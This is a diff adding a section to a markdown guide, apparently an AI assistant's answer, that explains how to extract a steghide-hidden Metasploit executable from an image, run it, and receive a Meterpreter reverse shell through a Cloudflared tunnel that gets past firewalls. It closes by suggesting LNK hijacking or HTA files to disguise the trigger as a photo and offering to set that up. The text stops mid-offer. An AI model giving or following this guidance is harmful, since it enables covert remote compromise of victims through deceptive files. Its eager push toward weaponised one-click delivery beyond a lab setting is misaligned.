@@ -34,3 +34,30 @@ steghide extract -sf cover.jpg
 -sf stands for Secret File (the modified image).
 
 Enter the passphrase you used when embedding, and Steghide will reconstruct payload.txt.
+
+
+. How to Actually Get the Shell (Lab Experiment)
+To see your Cloudflared + Metasploit setup in action, you have to manually "turn the key" in your lab:
+
+On your Kali CLI: Ensure your multi/handler is running and your Cloudflare tunnel is active.
+
+On your Target Machine: Open a terminal and run the extraction command.
+
+PowerShell
+# Example: Manually extracting and running the hidden payload
+steghide extract -sf lab_photo.jpg -p your_passphrase
+.\shell.exe
+
+3.  **Check Kali:** You should see a `Meterpreter session 1 opened` message.
+
+### Summary of the Workflow
+| Component | Function |
+| :--- | :--- |
+| **Metasploit** | Creates the "Phone Home" code. |
+| **Steghide** | Hides the code in a photo (Obfuscation). |
+| **Cloudflared** | Acts as the "Phone Line" through firewalls. |
+| **Execution Trigger** | The manual or scripted act of running the code. |
+
+If you want to move toward a "one-click" experience, you would need to look into **LNK File Hijacking** or **HTA (HTML Application)** files, which allow you to hide the "execution trigger" behind an icon that *looks* like a photo.
+
+**Do you want to try setting up the LNK shortcut trick to make it feel like a "one-
